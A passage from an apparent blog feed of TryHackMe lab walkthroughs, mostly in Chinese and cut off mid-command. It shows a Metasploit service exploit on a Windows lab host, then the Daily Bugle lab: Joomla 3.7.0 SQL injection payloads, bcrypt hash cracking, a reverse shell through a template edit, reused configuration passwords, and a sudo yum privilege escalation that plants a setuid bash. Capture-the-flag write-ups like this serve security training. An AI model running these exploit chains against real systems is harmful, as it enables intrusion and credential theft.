(x86)\Zero Tier\Zero Tier One\ZeroTier.exe <span class="hljs-keyword">for</span> zerotieroneservice<br>[*] Attempting to write 15872 bytes to C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe...<br>[+] Manual cleanup of C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe is required due to a potential reboot <span class="hljs-keyword">for</span> exploitation.<br>[+] Successfully wrote payload<br>[*] Launching service zerotieroneservice...<br>[*] Manual cleanup of the payload file is required. zerotieroneservice will fail to start as long as the payload remains on disk.<br>[*] Sending stage (175686 bytes) to 10.10.160.208<br>[*] Sending stage (175686 bytes) to 10.10.160.208<br>[*] Meterpreter session 3 opened (10.11.75.230:4444 -&gt; 10.10.160.208:50604) at 2022-07-12 17:06:13 +0800<br><br>(Meterpreter 3)(C:\Windows\system32) &gt; <span class="hljs-built_in">cd</span> /<br>(Meterpreter 3)(C:\) &gt; <span class="hljs-built_in">ls</span><br>Listing: C:\<br>============<br><br>Mode              Size   Type  Last modified              Name<br>----              ----   ----  -------------              ----<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 10:11:53 +0800  <span class="hljs-variable">$Recycle</span>.Bin<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-13 10:02:21 +0800  Atlassian<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 08:18:03 +0800  Documents and Settings<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 09:39:01 +0800  PerfLogs<br>040555/r-xr-xr-x  4096   <span class="hljs-built_in">dir</span>   2021-03-15 14:44:23 +0800  Program Files<br>040777/rwxrwxrwx  4096   <span class="hljs-built_in">dir</span>   2021-03-15 08:36:25 +0800  Program Files (x86)<br>040777/rwxrwxrwx  4096   <span class="hljs-built_in">dir</span>   2021-03-15 14:44:20 +0800  ProgramData<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 08:18:05 +0800  Recovery<br>040777/rwxrwxrwx  4096   <span class="hljs-built_in">dir</span>   2021-03-12 05:31:22 +0800  System Volume Information<br>040555/r-xr-xr-x  4096   <span class="hljs-built_in">dir</span>   2021-03-12 10:11:49 +0800  Users<br>040777/rwxrwxrwx  16384  <span class="hljs-built_in">dir</span>   2021-03-15 14:53:04 +0800  Windows<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-15 10:47:35 +0800  WorkShare<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 05:31:19 +0800  inetpub<br>040777/rwxrwxrwx  0      <span class="hljs-built_in">dir</span>   2021-03-12 06:52:52 +0800  logs<br>000000/---------  0      fif   1970-01-01 08:00:00 +0800  pagefile.sys<br><br>(Meterpreter 3)(C:\) &gt; <span class="hljs-built_in">cd</span> Users\\Administrator\\Desktop\\<br>(Meterpreter 3)(C:\Users\Administrator\Desktop) &gt; <span class="hljs-built_in">ls</span><br>Listing: C:\Users\Administrator\Desktop<br>=======================================<br><br>Mode              Size  Type  Last modified              Name<br>----              ----  ----  -------------              ----<br>100666/rw-rw-rw-  282   fil   2021-03-12 09:47:55 +0800  desktop.ini<br>100666/rw-rw-rw-  37    fil   2021-03-15 10:49:34 +0800  root.txt<br><br>(Meterpreter 3)(C:\Users\Administrator\Desktop) &gt; <span class="hljs-built_in">cat</span> root.txt <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Daily Bugle</title>
    <link href="/post/Tryhackme-Daily-Bugle.html"/>
    <url>/post/Tryhackme-Daily-Bugle.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ sudo masscan -p1-65535,U1-65535 10.10.163.61 --rate 2000 -e tun0<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-21 01:20:19 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [65535 ports/host]<br>Discovered open port 3306/tcp on 10.10.163.61                                  <br>Discovered open port 22/tcp on 10.10.163.61                                    <br>Discovered open port 80/tcp on 10.10.163.61                                    <br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ sudo nmap -sC -sV 10.10.163.61 -oN Daily -p3306,22,80 -Pn -T4         <br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-21 09:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.163.61<br>Host is up (0.35s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)<br>|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)<br>|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="hljs-number">5.6</span>.<span class="hljs-number">40</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">6</span> (CentOS) PHP/<span class="hljs-number">5.6</span>.<span class="hljs-number">40</span><br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>| http-robots.txt: <span class="hljs-number">15</span> disallowed entries <br>| /joomla/administrator/ /administrator/ /bin/ /cache/ <br>| /cli/ /components/ /includes/ /installation/ /language/ <br>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/<br><span class="hljs-number">3306</span>/tcp open  mysql   MariaDB (unauthorized)<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">23.21</span> seconds<br>zsh: segmentation fault  sudo nmap -sC -sV <span class="hljs-number">10.10</span>.<span class="hljs-number">163.61</span> -oN Daily -p3306,<span class="hljs-number">22</span>,<span class="hljs-number">80</span> -Pn -T4<br></code></pre></td></tr></table></figure><p>joomla可以用joomscan扫描探测一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>    ____  _____  _____  __  __  ___   ___    __    _  _ <br>   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )<br>  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( <br>  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)<br>                        (1337.today)<br>   <br>    --=[OWASP JoomScan<br>    +---++---==[Version : 0.0.7<br>    +---++---==[Update Date : [2018/09/23]<br>    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo<br>    --=[Code name : Self Challenge<br>    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP<br><br>Processing http://10.10.163.61 ...<br><br><br><br>[+] FireWall Detector<br>[++] Firewall not detected<br><br>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0<br><br>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable<br><br>[+] Checking Directory Listing<br>[++] directory has directory listing : <br>http://10.10.163.61/administrator/components<br>http://10.10.163.61/administrator/modules<br>http://10.10.163.61/administrator/templates<br>http://10.10.163.61/images/banners<br><br><br>[+] Checking apache info/status files<br>[++] Readable info/status files are not found<br><br>[+] admin finder<br>[++] Admin page : http://10.10.163.61/administrator/<br><br>[+] Checking robots.txt existing<br>[++] robots.txt is found<br>path : http://10.10.163.61/robots.txt <br><br>Interesting path found from robots.txt<br>http://10.10.163.61/joomla/administrator/<br>http://10.10.163.61/administrator/<br>http://10.10.163.61/bin/<br>http://10.10.163.61/cache/<br>http://10.10.163.61/cli/<br>http://10.10.163.61/components/<br>http://10.10.163.61/includes/<br>http://10.10.163.61/installation/<br>http://10.10.163.61/language/<br>http://10.10.163.61/layouts/<br>http://10.10.163.61/libraries/<br>http://10.10.163.61/logs/<br>http://10.10.163.61/modules/<br>http://10.10.163.61/plugins/<br>http://10.10.163.61/tmp/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ searchsploit Joomla 3.7.0              <br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>Joomla! 3.7.0 - <span class="hljs-string">&#x27;com_fields&#x27;</span> SQL Injection                                          | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                       | php/webapps/43488.txt<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>                                                                                                                      <br>Crazyinside:~/HTB$ searchsploit -m php/webapps/42033.txt<br>  Exploit: Joomla! 3.7.0 - <span class="hljs-string">&#x27;com_fields&#x27;</span> SQL Injection<br>      URL: https://www.exploit-db.com/exploits/42033<br>     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt<br>File Type: ASCII text<br><br>Copied to: /home/crazyinside/HTB/42033.txt<br><br><br>                                                                                                                      <br>Crazyinside:~/HTB$ <span class="hljs-built_in">cat</span> 42033.txt             <br><span class="hljs-comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="hljs-comment"># Date: 05-19-2017</span><br><span class="hljs-comment"># Exploit Author: Mateus Lino</span><br><span class="hljs-comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-comment"># Vendor Homepage: https://www.joomla.org/</span><br><span class="hljs-comment"># Version: = 3.7.0</span><br><span class="hljs-comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="hljs-comment"># CVE : - CVE-2017-8917</span><br><br><br>URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27<br><br><br>Using Sqlmap:<br><br>sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br><br>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)<br><br>    Type: error-based<br>    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)<br></code></pre></td></tr></table></figure><p>布尔注入太慢了。有另一种替代方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ python2 joomblah.py http://10.10.163.61                                                         1 ⨯<br>                                                                                                                    <br>    .---.    .-<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.        .-&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>-.                                                           <br>    |   |   <span class="hljs-string">&#x27;   _    \     &#x27;</span>   _    \                            .---.                        <br>    <span class="hljs-string">&#x27;---&#x27;</span> /   /` <span class="hljs-string">&#x27;.   \  /   /` &#x27;</span>.   \  __  __   ___   /|        |   |            .           <br>    .---..   |     \  <span class="hljs-string">&#x27; .   |     \  &#x27;</span> |  |/  `.<span class="hljs-string">&#x27;   `. ||        |   |          .&#x27;</span>|           <br>    |   ||   <span class="hljs-string">&#x27;      |  &#x27;</span>|   <span class="hljs-string">&#x27;      |  &#x27;</span>|   .-.  .-.   <span class="hljs-string">&#x27;||        |   |         &lt;  |           </span><br><span class="hljs-string">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           </span><br><span class="hljs-string">    |   | `.   ` ..&#x27;</span> /   `.   ` ..<span class="hljs-string">&#x27; /  |  |  |  |  |  |||/&#x27;</span>__ <span class="hljs-string">&#x27;. |   | .:--.&#x27;</span>.  | | .<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.    </span><br><span class="hljs-string">    |   |    &#x27;</span>-...-<span class="hljs-string">&#x27;`       &#x27;</span>-...-<span class="hljs-string">&#x27;`   |  |  |  |  |  ||:/`  &#x27;</span>. <span class="hljs-string">&#x27;|   |/ |   \ | | |/.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>. \   <br>    |   |                              |  |  |  |  |  |||     | ||   |`<span class="hljs-string">&quot; __ | | |  /    | |   </span><br><span class="hljs-string">    |   |                              |__|  |__|  |__|||\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |   </span><br><span class="hljs-string"> __.&#x27;   &#x27;                                              |/&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   </span><br><span class="hljs-string">|      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \ \._,\ &#x27;/| &#x27;.    | &#x27;.  </span><br><span class="hljs-string">|____.&#x27;                                                                `--&#x27;  `&quot;</span> <span class="hljs-string">&#x27;---&#x27;</span>   <span class="hljs-string">&#x27;---&#x27;</span> <br><br> [-] Fetching CSRF token<br> [-] Testing SQLi<br>  -  Found table: fb9j5_users<br>  -  Extracting <span class="hljs-built_in">users</span> from fb9j5_users<br> [$] Found user [<span class="hljs-string">&#x27;811&#x27;</span>, <span class="hljs-string">&#x27;Super User&#x27;</span>, <span class="hljs-string">&#x27;jonah&#x27;</span>, <span class="hljs-string">&#x27;jonah@tryhackme.com&#x27;</span>, <span class="hljs-string">&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br>  -  Extracting sessions from fb9j5_session<br>                                                                                                                       <br>Crazyinside:~/HTB$ hashid<br>$2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm<br>Analyzing <span class="hljs-string">&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span><br>[+] Blowfish(OpenBSD) <br>[+] Woltlab Burning Board 4.x <br>[+] bcrypt <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ hashcat -h | grep bcrypt                                                                      130 ⨯<br>   3200 | bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix)                        | Operating System<br>  25600 | bcrypt(md5(<span class="hljs-variable">$pass</span>)) / bcryptmd5                      | Forums, CMS, E-Commerce<br>  25800 | bcrypt(sha1(<span class="hljs-variable">$pass</span>)) / bcryptsha1                    | Forums, CMS, E-Commerce<br>                                                                                                                       <br>Crazyinside:~/HTB$ hashcat -m 3200 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt <br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>============================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 6857/13779 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 72<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Initializing backend runtime <span class="hljs-keyword">for</span> device <span class="hljs-comment">#1. Please be patient...</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 3200 (bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix))<br>Hash.Target......: $2y$10<span class="hljs-variable">$0veO</span>/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm<br>Time.Started.....: Thu Jul 21 09:55:45 2022 (8 mins, 23 secs)<br>Time.Estimated...: Thu Jul 21 10:04:08 2022 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:       92 H/s (2.67ms) @ Accel:8 Loops:32 Thr:1 Vec:1</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 46840/14344385 (0.33%)<br>Rejected.........: 0/46840 (0.00%)<br>Restore.Point....: 46832/14344385 (0.33%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: staffy -&gt; sorriso</span><br>Hardware.Mon.<span class="hljs-comment">#1..: Temp: 72c Util: 82%</span><br><br>Started: Thu Jul 21 09:55:02 2022<br>Stopped: Thu Jul 21 10:04:10 2022<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721103755437.png" alt="image-20220721103755437"></p><p>写入反弹shell的代码点击模板预览即可加载执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.14.24.91] from (UNKNOWN) [10.10.163.61] 42652<br>Linux dailybugle 3.10.0-1062.el7.x86_64 <span class="hljs-comment">#1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 22:52:39 up  1:33,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=48(apache) gid=48(apache) <span class="hljs-built_in">groups</span>=48(apache)<br>sh: no job control <span class="hljs-keyword">in</span> this shell<br>sh-4.2$ <br></code></pre></td></tr></table></figure><p>joomla需要配备数据库，最开始目标也扫出了3306.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> configuration.php <br>&lt;?php<br>class JConfig &#123;<br>        public <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        public <span class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;The Daily Bugle&#x27;</span>;<br>        public <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        public <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        public <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        public <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        public <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;nv5uz9r3ZEDzVjNu&#x27;</span>;<br>        public <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomla&#x27;</span>;<br>        public <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;fb9j5_&#x27;</span>;<br>        public <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;UAMBRWzHO3oFPmVC&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以用该密码直接切换到jjameson：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle home]$ sudo  -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jjameson on dailybugle:<br>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,<br>    env_reset, env_keep=<span class="hljs-string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,<br>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin<br><br>User jjameson may run the following commands on dailybugle:<br>    (ALL) NOPASSWD: /usr/bin/yum<br>[jjameson@dailybugle home]$ <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721110803049.png" alt="image-20220721110803049"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash&#x27;</span> &gt; <span class="hljs-variable">$TF</span>/x.sh<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ fpm -n x 